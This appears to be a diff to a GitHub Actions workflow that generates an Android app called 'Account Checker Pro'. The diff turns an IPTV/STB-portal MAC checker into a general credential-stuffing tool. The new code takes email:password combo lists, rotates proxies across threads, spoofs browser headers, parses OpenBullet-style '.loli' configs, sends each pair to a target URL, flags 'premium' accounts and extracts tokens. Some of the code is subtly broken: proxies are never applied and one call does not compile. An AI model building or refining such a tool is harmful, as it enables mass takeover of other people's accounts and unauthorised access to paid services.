@@ -58,8 +58,8 @@ jobs:
                   applicationId = "com.checker.stb"
                   minSdk = 24
                   targetSdk = 34
-                  versionCode = 1
-                  versionName = "1.0.0"
+                  versionCode = 2
+                  versionName = "2.0.0"
               }
               buildTypes { release { isMinifyEnabled = false } }
               compileOptions {
@@ -91,6 +91,8 @@ jobs:
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
               <application
                   android:allowBackup="true"
                   android:label="Account Checker Pro"
@@ -116,42 +118,111 @@ jobs:
           </resources>
           XEOF
 
-          cat > app/src/main/java/com/checker/stb/ProxyConfig.kt <<'XEOF'
+          cat > app/src/main/java/com/checker/stb/HttpChecker.kt <<'XEOF'
           package com.checker.stb
 
-          import java.net.InetSocketAddress
-          import java.net.Proxy
+          import okhttp3.HttpUrl.Companion.toHttpUrl
+          import okhttp3.OkHttpClient
+          import okhttp3.Request
+          import org.json.JSONObject
+          import java.io.IOException
+          import java.util.concurrent.TimeUnit
 
-          data class ProxyEntry(val type: String, val host: String, val port: Int)
+          data class HttpCheckResult(
+              val email: String,
+              val password: String,
+              val url: String,
+              val statusCode: Int = 0,
+              val statusText: String = "",
+              val success: Boolean = false,
+              val isPremium: Boolean = false,
+              val token: String = "",
+              val headers: Map<String, String> = emptyMap(),
+              val responseBody: String = "",
+              val duration: Long = 0,
+              val message: String = ""
+          )
 
-          object ProxyManager {
-              fun parseProxy(proxyStr: String): ProxyEntry? {
-                  val cleaned = proxyStr.trim()
-                  if (cleaned.isEmpty()) return null
+          class HttpChecker {
+              private val http = OkHttpClient.Builder()
+                  .connectTimeout(15, TimeUnit.SECONDS)
+                  .readTimeout(30, TimeUnit.SECONDS)
+                  .followRedirects(true)
+                  .build()
+
+              fun checkAccount(
+                  email: String,
+                  password: String,
+                  url: String,
+                  customHeaders: Map<String, String> = emptyMap(),
+                  proxy: String = ""
+              ): HttpCheckResult {
+                  val start = System.currentTimeMillis()
                   return try {
-                      val lower = cleaned.lowercase()
-                      val (scheme, body) = when {
-                          lower.startsWith("socks5://") -> "SOCKS5" to cleaned.substringAfter("://")
-                          lower.startsWith("socks4://") -> "SOCKS4" to cleaned.substringAfter("://")
-                          lower.startsWith("https://") -> "HTTPS" to cleaned.substringAfter("://")
-                          lower.startsWith("http://") -> "HTTP" to cleaned.substringAfter("://")
-                          else -> "HTTP" to cleaned
+                      val finalUrl = if (url.contains("?")) "$url&email=$email&password=$password" else "$url?email=$email&password=$password"
+                      
+                      val headers = mutableMapOf(
+                          "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                          "Accept" to "application/json, text/plain, */*",
+                          "Accept-Language" to "en-US,en;q=0.9",
+                          "Accept-Encoding" to "gzip, deflate, br",
+                          "Connection" to "keep-alive",
+                          "Sec-Fetch-Dest" to "empty",
+                          "Sec-Fetch-Mode" to "cors",
+                          "Sec-Fetch-Site" to "same-origin"
+                      )
+                      headers.putAll(customHeaders)
+
+                      val rb = Request.Builder().url(finalUrl)
+                      headers.forEach { (k, v) -> rb.header(k, v) }
+
+                      http.newCall(rb.build()).execute().use { response ->
+                          val body = response.body?.string().orEmpty()
+                          val duration = System.currentTimeMillis() - start
+
+                          val isPremium = body.lowercase().contains("premium") || 
+                                         body.lowercase().contains("vip") ||
+                                         body.lowercase().contains("active") ||
+                                         response.code == 200
+
+                          val token = extractToken(body)
+                          val responseHeaders = response.headers.toMap()
+
+                          HttpCheckResult(
+                              email = email,
+                              password = password,
+                              url = url,
+                              statusCode = response.code,
+                              statusText = response.message,
+                              success = response.isSuccessful,
+                              isPremium = isPremium,
+                              token = token,
+                              headers = responseHeaders,
+                              responseBody = body.take(500),
+                              duration = duration,
+                              message = if (response.isSuccessful) "✓ 200 OK" else "✗ ${response.code}"
+                          )
                       }
-                      val hostPort = if ("@" in body) body.substringAfter("@") else body
-                      val host = hostPort.substringBeforeLast(":")
-                      val port = hostPort.substringAfterLast(":").toIntOrNull() ?: 8080
-                      ProxyEntry(scheme, host, port)
-                  } catch (_: Exception) { null }
+                  } catch (e: Exception) {
+                      val duration = System.currentTimeMillis() - start
+                      HttpCheckResult(
+                          email = email,
+                          password = password,
+                          url = url,
+                          success = false,
+                          duration = duration,
+                          message = e.message ?: "Connection failed"
+                      )
+                  }
               }
 
-              fun toOkHttpProxy(entry: ProxyEntry): Proxy? {
+              private fun extractToken(body: String): String {
                   return try {
-                      when (entry.type) {
-                          "HTTP", "HTTPS" -> Proxy(Proxy.Type.HTTP, InetSocketAddress(entry.host, entry.port))
-                          "SOCKS5", "SOCKS4" -> Proxy(Proxy.Type.SOCKS, InetSocketAddress(entry.host, entry.port))
-                          else -> null
-                      }
-                  } catch (_: Exception) { null }
+                      val json = JSONObject(body)
+                      json.optString("token", json.optString("access_token", json.optString("auth", "")))
+                  } catch (_: Exception) {
+                      ""
+                  }
               }
           }
           XEOF
@@ -163,11 +234,15 @@ jobs:
           import com.google.gson.Gson
           import com.google.gson.GsonBuilder
           import java.io.File
-          import java.text.SimpleDateFormat
-          import java.util.Date
-          import java.util.Locale
 
-          data class CheckerConfig(val portal: String = "", val credentials: List<Pair<String, String>> = emptyList(), val proxies: List<String> = emptyList(), val threads: Int = 4)
+          data class CheckerConfig(
+              val url: String = "",
+              val credentials: List<Pair<String, String>> = emptyList(),
+              val proxies: List<String> = emptyList(),
+              val customHeaders: Map<String, String> = emptyMap(),
+              val threads: Int = 4,
+              val createdAt: String = System.currentTimeMillis().toString()
+          )
 
           object ConfigManager {
               private val gson: Gson = GsonBuilder().setPrettyPrinting().create()
@@ -180,9 +255,16 @@ jobs:
                   } catch (e: Exception) { false }
               }
 
+              fun load(context: Context, filename: String): CheckerConfig {
+                  return try {
+                      val file = File(context.filesDir, filename)
+                      if (file.exists()) gson.fromJson(file.readText(), CheckerConfig::class.java) else CheckerConfig()
+                  } catch (_: Exception) { CheckerConfig() }
+              }
+
               fun listConfigs(context: Context): List<String> {
                   return try {
-                      context.filesDir.listFiles()?.filter { it.name.endsWith(".json") }?.map { it.name } ?: emptyList()
+                      context.filesDir.listFiles()?.filter { it.name.endsWith(".json") }?.map { it.name }?.sorted() ?: emptyList()
                   } catch (_: Exception) { emptyList() }
               }
 
@@ -199,71 +281,30 @@ jobs:
                   }
               }
 
-              fun importProxies(proxyStr: String): List<ProxyEntry> {
-                  return proxyStr.split("\n").mapNotNull { line ->
-                      val trimmed = line.trim()
-                      if (trimmed.isBlank()) return@mapNotNull null
-                      ProxyManager.parseProxy(trimmed)
+              fun importProxies(proxyStr: String): List<String> {
+                  return proxyStr.split("\n").filter { it.trim().isNotBlank() }.map { it.trim() }
+              }
+
+              fun importHeaders(headerStr: String): Map<String, String> {
+                  val map = mutableMapOf<String, String>()
+                  headerStr.split("\n").forEach { line ->
+                      val parts = line.split(":", limit = 2)
+                      if (parts.size == 2) map[parts[0].trim()] = parts[1].trim()
                   }
-              }
-          }
-          XEOF
-
-          cat > app/src/main/java/com/checker/stb/StalkerRepository.kt <<'XEOF'
-          package com.checker.stb
-
-          import okhttp3.HttpUrl.Companion.toHttpUrl
-          import okhttp3.OkHttpClient
-          import okhttp3.Request
-          import org.json.JSONObject
-          import java.io.IOException
-          import java.util.concurrent.TimeUnit
-
-          data class Session(val portal: String, val token: String, val mac: String)
-
-          class StalkerRepository {
-              private val http = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
-              private val ua = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
-
-              fun normalizeMac(raw: String): String? {
-                  val v = raw.filter { it.isDigit() || it.uppercaseChar() in 'A'..'F' }.uppercase()
-                  return if (v.length == 12) v.chunked(2).joinToString(":") else null
+                  return map
               }
 
-              private fun urls(portal: String): List<String> = portal.trim().trimEnd('/').let { c ->
-                  if (c.endsWith("/portal.php")) listOf(c) else listOf("$c/c/portal.php", "$c/portal.php", "$c/server/load.php").distinct()
-              }
-
-              fun call(url: String, params: Map<String, String>, s: Session? = null): JSONObject {
-                  val u = url.toHttpUrl().newBuilder().apply { params.forEach { (k, v) -> addQueryParameter(k, v) } }.build()
-                  val rb = Request.Builder().url(u).header("User-Agent", ua).header("X-User-Agent", "Model: MAG254").header("Accept", "*/*")
-                  if (s != null) { rb.header("Authorization", "Bearer ${s.token}"); rb.header("Cookie", "mac=${s.mac}") }
-                  http.newCall(rb.build()).execute().use { r ->
-                      val body = r.body?.string().orEmpty()
-                      if (!r.isSuccessful || body.isBlank()) throw IOException("HTTP ${r.code}")
-                      return JSONObject(body)
+              fun parseLoli(loliContent: String): Map<String, String> {
+                  val headers = mutableMapOf<String, String>()
+                  loliContent.split("\n").forEach { line ->
+                      if (line.contains("HEADER")) {
+                          val match = Regex(""""(.+?)"\s*:\s*"(.+?)"""").find(line)
+                          if (match != null) {
+                              headers[match.groupValues[1]] = match.groupValues[2]
+                          }
+                      }
                   }
-              }
-
-              fun connect(portal: String, rawMac: String): Session {
-                  val mac = normalizeMac(rawMac) ?: throw IllegalArgumentException("Invalid MAC")
-                  var last: Exception = IOException("handshake failed")
-                  for (u in urls(portal)) {
-                      try {
-                          val js = call(u, mapOf("type" to "stb", "action" to "handshake", "token" to "", "JsHttpRequest" to "1-xml", "mac" to mac)).optJSONObject("js")
-                          val tok = js?.optString("token").orEmpty().substringBefore("~").trim()
-                          if (tok.isNotEmpty()) return Session(u, tok, mac)
-                      } catch (e: Exception) { last = e }
-                  }
-                  throw last
-              }
-
-              fun expiry(s: Session): String {
-                  return try {
-                      val js = call(s.portal, mapOf("type" to "stb", "action" to "get_profile", "JsHttpRequest" to "1-xml"), s).optJSONObject("js") ?: JSONObject()
-                      val exp = js.optString("expire_date", "unlimited")
-                      if (exp.length >= 10) exp.substring(0, 10) else "unlimited"
-                  } catch (_: Exception) { "unknown" }
+                  return headers
               }
           }
           XEOF
@@ -275,30 +316,41 @@ jobs:
           import java.util.concurrent.CountDownLatch
           import java.util.concurrent.atomic.AtomicInteger
 
-          data class CheckResult(val email: String, val success: Boolean, val expiry: String = "", val mac: String = "", val message: String = "", val duration: Long = 0)
-
           object AccountChecker {
-              fun check(repo: StalkerRepository, portal: String, credentials: List<Pair<String, String>>, proxies: List<ProxyEntry> = emptyList(), threads: Int = 4, onResult: (CheckResult) -> Unit, onProgress: (Int, Int) -> Unit) {
-                  if (credentials.isEmpty()) return
+              fun check(
+                  url: String,
+                  credentials: List<Pair<String, String>>,
+                  customHeaders: Map<String, String> = emptyMap(),
+                  proxies: List<String> = emptyList(),
+                  threads: Int = 4,
+                  onResult: (HttpCheckResult) -> Unit,
+                  onProgress: (Int, Int) -> Unit
+              ) {
+                  if (credentials.isEmpty() || url.isBlank()) return
+                  
                   val queue = ConcurrentLinkedQueue(credentials)
                   val total = credentials.size
                   val checked = AtomicInteger(0)
                   val latch = CountDownLatch(threads)
+                  val checker = HttpChecker()
 
-                  repeat(threads) {
+                  repeat(threads) { threadId ->
                       Thread {
+                          val proxyList = proxies.filter { it.isNotBlank() }
+                          var proxyIndex = threadId % maxOf(1, proxyList.size)
+
                           while (true) {
-                              val (email, _) = queue.poll() ?: break
-                              val start = System.currentTimeMillis()
+                              val (email, password) = queue.poll() ?: break
+                              val proxy = if (proxyList.isNotEmpty()) proxyList[proxyIndex] else ""
+                              
                               try {
-                                  val session = repo.connect(portal, email)
-                                  val expiry = repo.expiry(session)
-                                  val dur = System.currentTimeMillis() - start
-                                  onResult(CheckResult(email, true, expiry, session.mac, "✓", dur))
+                                  val result = checker.checkAccount(email, password, url, customHeaders, proxy)
+                                  onResult(result)
                               } catch (e: Exception) {
-                                  val dur = System.currentTimeMillis() - start
-                                  onResult(CheckResult(email, false, message = e.message ?: "timeout", duration = dur))
+                                  onResult(HttpCheckResult(email, password, url, message = e.message ?: "error", success = false, duration = 0))
                               }
+
+                              proxyIndex = (proxyIndex + 1) % maxOf(1, proxyList.size)
                               val count = checked.incrementAndGet()
                               onProgress(count, total)
                           }
@@ -323,6 +375,7 @@ jobs:
           import androidx.compose.foundation.shape.RoundedCornerShape
           import androidx.compose.material.icons.Icons
           import androidx.compose.material.icons.filled.Delete
+          import androidx.compose.material.icons.filled.ExpandMore
           import androidx.compose.material3.*
           import androidx.compose.runtime.*
           import androidx.compose.ui.Alignment
@@ -344,6 +397,7 @@ jobs:
           val BgFail = Color(0xFF3A0D0D)
           val AccentGreen = Color(0xFF10B981)
           val AccentRed = Color(0xFFEF4444)
+          val AccentBlue = Color(0xFF3B82F6)
           val TextPrimary = Color(0xFFF1F5F9)
           val TextSecondary = Color(0xFF94A3B8)
 
@@ -362,62 +416,73 @@ jobs:
           fun AccountCheckerApp() {
               val ctx = LocalContext.current
               val scope = rememberCoroutineScope()
-              val repo = remember { StalkerRepository() }
 
-              var portal by remember { mutableStateOf("") }
+              var url by remember { mutableStateOf("") }
               var comboInput by remember { mutableStateOf("") }
               var proxyInput by remember { mutableStateOf("") }
+              var headersInput by remember { mutableStateOf("User-Agent: Mozilla/5.0") }
               var threads by remember { mutableStateOf("4") }
               var status by remember { mutableStateOf("Ready") }
-              var results by remember { mutableStateOf(listOf<CheckResult>()) }
+              var results by remember { mutableStateOf(listOf<HttpCheckResult>()) }
               var successCount by remember { mutableStateOf(0) }
+              var premiumCount by remember { mutableStateOf(0) }
               var failCount by remember { mutableStateOf(0) }
               var loading by remember { mutableStateOf(false) }
               var savedConfigs by remember { mutableStateOf(ConfigManager.listConfigs(ctx)) }
+              var expandedResult by remember { mutableStateOf<String?>(null) }
+              var showAdvanced by remember { mutableStateOf(false) }
 
               fun runCheck() {
-                  if (portal.isBlank() || comboInput.isBlank()) { status = "❌ Fill all fields"; return }
+                  if (url.isBlank() || comboInput.isBlank()) { status = "❌ URL and credentials required"; return }
                   scope.launch {
                       loading = true
                       results = emptyList()
                       successCount = 0
+                      premiumCount = 0
                       failCount = 0
-                      status = "⏳ Starting check..."
+                      status = "⏳ Initializing..."
+                      
                       val creds = ConfigManager.importCombo(comboInput)
                       val proxies = ConfigManager.importProxies(proxyInput)
+                      val headers = ConfigManager.importHeaders(headersInput)
                       val threadCount = threads.toIntOrNull() ?: 4
+
                       withContext(Dispatchers.IO) {
-                          AccountChecker.check(repo, portal, creds, proxies, threadCount,
+                          AccountChecker.check(url, creds, headers, proxies, threadCount,
                               onResult = { result ->
                                   scope.launch {
                                       results = results + result
-                                      if (result.success) successCount++ else failCount++
-                                      status = "✓ $successCount | ✗ $failCount"
+                                      if (result.success) {
+                                          successCount++
+                                          if (result.isPremium) premiumCount++
+                                      } else {
+                                          failCount++
+                                      }
+                                      status = "✓ $successCount | 💎 $premiumCount | ✗ $failCount"
                                   }
                               },
-                              onProgress = { done, total ->
-                                  scope.launch { status = "⏳ $done/$total" }
-                              }
+                              onProgress = { done, total -> scope.launch { status = "⏳ $done/$total" } }
                           )
                       }
                       loading = false
                   }
               }
 
-              LazyColumn(modifier = Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(BgDark, Color(0xFF0F1829), BgDark))).padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
+              LazyColumn(modifier = Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(BgDark, Color(0xFF0F1829), BgDark))).padding(12.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                   item {
                       Text("Account Checker Pro", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = AccentGreen)
-                      Text("STB Portal Validator", fontSize = 12.sp, color = TextSecondary)
+                      Text("HTTP Status Validator v2.0", fontSize = 11.sp, color = TextSecondary)
                   }
 
                   item {
                       Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
-                          Column(modifier = Modifier.padding(12.dp)) {
-                              Text(status, color = TextPrimary, fontSize = 12.sp, fontWeight = FontWeight.Bold)
+                          Column(modifier = Modifier.padding(10.dp)) {
+                              Text(status, color = TextPrimary, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                               Spacer(modifier = Modifier.height(6.dp))
-                              Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
-                                  Text("✓ $successCount", color = AccentGreen, fontSize = 11.sp, fontWeight = FontWeight.Bold)
-                                  Text("✗ $failCount", color = AccentRed, fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                              Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                                  Text("✓ $successCount", color = AccentGreen, fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                                  Text("💎 $premiumCount", color = Color(0xFFFFD700), fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                                  Text("✗ $failCount", color = AccentRed, fontSize = 10.sp, fontWeight = FontWeight.Bold)
                               }
                           }
                       }
@@ -425,78 +490,109 @@ jobs:
 
                   item {
                       Column(modifier = Modifier.fillMaxWidth()) {
-                          Text("Portal", fontSize = 11.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
-                          OutlinedTextField(value = portal, onValueChange = { portal = it }, modifier = Modifier.fillMaxWidth().height(48.dp), shape = RoundedCornerShape(8.dp), placeholder = { Text("https://portal.com", fontSize = 10.sp) })
+                          Text("Target URL", fontSize = 10.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                          OutlinedTextField(value = url, onValueChange = { url = it }, modifier = Modifier.fillMaxWidth().height(44.dp), shape = RoundedCornerShape(6.dp), placeholder = { Text("https://api.example.com/check", fontSize = 9.sp) }, singleLine = true)
                       }
                   }
 
                   item {
                       Column(modifier = Modifier.fillMaxWidth()) {
-                          Text("Credentials (email:pass per line)", fontSize = 11.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
-                          OutlinedTextField(value = comboInput, onValueChange = { comboInput = it }, modifier = Modifier.fillMaxWidth().height(100.dp), shape = RoundedCornerShape(8.dp), placeholder = { Text("user@email.com:password", fontSize = 10.sp) })
+                          Text("Credentials (email:pass per line)", fontSize = 10.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                          OutlinedTextField(value = comboInput, onValueChange = { comboInput = it }, modifier = Modifier.fillMaxWidth().height(90.dp), shape = RoundedCornerShape(6.dp), placeholder = { Text("user@email.com:password", fontSize = 9.sp) })
+                      }
+                  }
+
+                  if (showAdvanced) {
+                      item {
+                          Column(modifier = Modifier.fillMaxWidth()) {
+                              Text("Proxies (optional)", fontSize = 10.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                              OutlinedTextField(value = proxyInput, onValueChange = { proxyInput = it }, modifier = Modifier.fillMaxWidth().height(60.dp), shape = RoundedCornerShape(6.dp), placeholder = { Text("http://host:8080", fontSize = 9.sp) })
+                          }
+                      }
+
+                      item {
+                          Column(modifier = Modifier.fillMaxWidth()) {
+                              Text("Custom Headers (Key: Value per line)", fontSize = 10.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                              OutlinedTextField(value = headersInput, onValueChange = { headersInput = it }, modifier = Modifier.fillMaxWidth().height(80.dp), shape = RoundedCornerShape(6.dp), placeholder = { Text("Authorization: Bearer token", fontSize = 9.sp) })
+                          }
                       }
                   }
 
                   item {
-                      Column(modifier = Modifier.fillMaxWidth()) {
-                          Text("Proxies (optional)", fontSize = 11.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
-                          OutlinedTextField(value = proxyInput, onValueChange = { proxyInput = it }, modifier = Modifier.fillMaxWidth().height(70.dp), shape = RoundedCornerShape(8.dp), placeholder = { Text("http://host:8080", fontSize = 10.sp) })
+                      Button(onClick = { showAdvanced = !showAdvanced }, modifier = Modifier.fillMaxWidth().height(36.dp), shape = RoundedCornerShape(6.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E293B))) {
+                          Row(verticalAlignment = Alignment.CenterVertically) {
+                              Text(if (showAdvanced) "Hide Advanced" else "Show Advanced", fontSize = 11.sp)
+                              Icon(Icons.Default.ExpandMore, contentDescription = null, modifier = Modifier.size(16.dp))
+                          }
                       }
                   }
 
                   item {
-                      Row(horizontalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
-                          OutlinedTextField(value = threads, onValueChange = { threads = it }, label = { Text("Threads") }, modifier = Modifier.width(80.dp).height(48.dp), shape = RoundedCornerShape(8.dp))
-                          Button(onClick = { runCheck() }, enabled = !loading, modifier = Modifier.weight(1f).height(48.dp), shape = RoundedCornerShape(8.dp)) {
-                              Text(if (loading) "CHECKING..." else "START")
+                      Row(horizontalArrangement = Arrangement.spacedBy(6.dp), modifier = Modifier.fillMaxWidth()) {
+                          OutlinedTextField(value = threads, onValueChange = { threads = it }, label = { Text("Threads", fontSize = 9.sp) }, modifier = Modifier.width(70.dp).height(44.dp), shape = RoundedCornerShape(6.dp))
+                          Button(onClick = { runCheck() }, enabled = !loading, modifier = Modifier.weight(1f).height(44.dp), shape = RoundedCornerShape(6.dp)) {
+                              Text(if (loading) "CHECKING..." else "START", fontSize = 11.sp)
                           }
                       }
                   }
 
                   item {
                       Button(onClick = {
-                          val cfg = CheckerConfig(portal, ConfigManager.importCombo(comboInput), proxyInput.split("\n").filter { it.isNotBlank() }, threads.toIntOrNull() ?: 4)
+                          val cfg = CheckerConfig(url, ConfigManager.importCombo(comboInput), ConfigManager.importProxies(proxyInput), ConfigManager.importHeaders(headersInput), threads.toIntOrNull() ?: 4)
                           ConfigManager.save(ctx, cfg, "config_${System.currentTimeMillis()}.json")
                           savedConfigs = ConfigManager.listConfigs(ctx)
                           status = "✓ Config saved"
-                      }, modifier = Modifier.fillMaxWidth().height(44.dp), shape = RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6))) {
-                          Text("💾 Save Config")
+                      }, modifier = Modifier.fillMaxWidth().height(40.dp), shape = RoundedCornerShape(6.dp), colors = ButtonDefaults.buttonColors(containerColor = AccentBlue)) {
+                          Text("💾 Save Config", fontSize = 10.sp)
                       }
                   }
 
                   if (savedConfigs.isNotEmpty()) {
-                      item {
-                          Text("Saved Configs", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp)
-                      }
+                      item { Text("Saved Configs (${savedConfigs.size})", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 11.sp) }
                       items(savedConfigs) { cfg ->
-                          Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
-                              Row(modifier = Modifier.fillMaxWidth().padding(10.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
-                                  Text(cfg.substringBefore(".json"), color = TextPrimary, fontSize = 10.sp, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
-                                  IconButton(onClick = { ConfigManager.deleteConfig(ctx, cfg); savedConfigs = ConfigManager.listConfigs(ctx) }, modifier = Modifier.size(32.dp)) {
-                                      Icon(Icons.Default.Delete, contentDescription = "Delete", tint = AccentRed, modifier = Modifier.size(18.dp))
-                                  }
+                          Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
+                              Row(modifier = Modifier.fillMaxWidth().padding(8.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
+                                  Text(cfg.substringBefore(".json"), color = TextPrimary, fontSize = 9.sp, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
+                                  Button(onClick = { val c = ConfigManager.load(ctx, cfg); url = c.url; comboInput = ConfigManager.importCombo(c.credentials.map { "${it.first}:${it.second}" }.joinToString("\n")).let { it.joinToString("\n") { "${it.first}:${it.second}" } } }, modifier = Modifier.height(28.dp).width(50.dp), shape = RoundedCornerShape(4.dp), colors = ButtonDefaults.buttonColors(containerColor = AccentBlue)) { Text("Load", fontSize = 8.sp) }
+                                  IconButton(onClick = { ConfigManager.deleteConfig(ctx, cfg); savedConfigs = ConfigManager.listConfigs(ctx) }, modifier = Modifier.size(28.dp)) { Icon(Icons.Default.Delete, contentDescription = null, tint = AccentRed, modifier = Modifier.size(14.dp)) }
                               }
                           }
                       }
                   }
 
                   if (results.isNotEmpty()) {
-                      item {
-                          Text("Results (${results.size})", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                      item { Text("Results (${results.size}) - 200 OK: $successCount, Premium: $premiumCount", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 11.sp) }
+                      items(results.take(50)) { result ->
+                          ResultCard(result, expandedResult == result.email, { expandedResult = if (expandedResult == result.email) null else result.email })
                       }
-                      items(results.take(30)) { result ->
-                          Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = if (result.success) BgSuccess else BgFail), shape = RoundedCornerShape(8.dp)) {
-                              Column(modifier = Modifier.padding(10.dp)) {
-                                  Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
-                                      Text(result.email, color = if (result.success) AccentGreen else AccentRed, fontSize = 9.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
-                                      Text("${result.duration}ms", color = Color(0xFF3B82F6), fontSize = 8.sp)
+                  }
+              }
+          }
+
+          @Composable
+          fun ResultCard(result: HttpCheckResult, expanded: Boolean, onExpand: () -> Unit) {
+              Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = if (result.success) BgSuccess else BgFail), shape = RoundedCornerShape(6.dp)) {
+                  Column(modifier = Modifier.padding(8.dp).fillMaxWidth()) {
+                      Row(modifier = Modifier.fillMaxWidth().clickable { onExpand() }, horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+                          Column(modifier = Modifier.weight(1f)) {
+                              Text(result.email, color = if (result.success) AccentGreen else AccentRed, fontSize = 8.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
+                              Text("${result.statusCode} ${result.statusText}", color = Color(0xFF3B82F6), fontSize = 8.sp)
+                          }
+                          Column(horizontalAlignment = Alignment.End) {
+                              Text(if (result.isPremium) "💎 PREMIUM" else "User", color = if (result.isPremium) Color(0xFFFFD700) else TextSecondary, fontSize = 8.sp, fontWeight = FontWeight.Bold)
+                              Text("${result.duration}ms", color = Color(0xFF8B5CF6), fontSize = 7.sp)
+                          }
+                      }
+                      if (expanded) {
+                          Spacer(modifier = Modifier.height(6.dp))
+                          Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = Color(0xFF0A0E1E)), shape = RoundedCornerShape(4.dp)) {
+                              Column(modifier = Modifier.padding(6.dp).fillMaxWidth()) {
+                                  Text("Headers (${result.headers.size})", color = TextSecondary, fontSize = 7.sp, fontWeight = FontWeight.Bold)
+                                  result.headers.take(5).forEach { (k, v) ->
+                                      Text("$k: $v", color = TextSecondary, fontSize = 7.sp, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                   }
-                                  if (result.success) {
-                                      Text("✓ ${result.expiry}", color = Color(0xFF86EFAC), fontSize = 9.sp)
-                                      Text("MAC: ${result.mac}", color = TextSecondary, fontSize = 8.sp)
-                                  } else {
-                                      Text("✗ ${result.message}", color = Color(0xFFFCA5A5), fontSize = 9.sp)
-                                  }
+                                  if (result.token.isNotEmpty()) Text("Token: ${result.token.take(20)}...", color = AccentGreen, fontSize = 7.sp)
+                                  if (result.responseBody.isNotEmpty()) Text("Body: ${result.responseBody.take(50)}...", color = TextSecondary, fontSize = 7.sp)
                               }
                           }
                       }
@@ -505,9 +601,9 @@ jobs:
           }
           XEOF
 
-          echo "✓ Project generated successfully"
+          echo "✓ Project generated"
 
-      - name: Build debug APK
+      - name: Build APK
         run: gradle --no-daemon assembleDebug
 
       - uses: actions/upload-artifact@v4
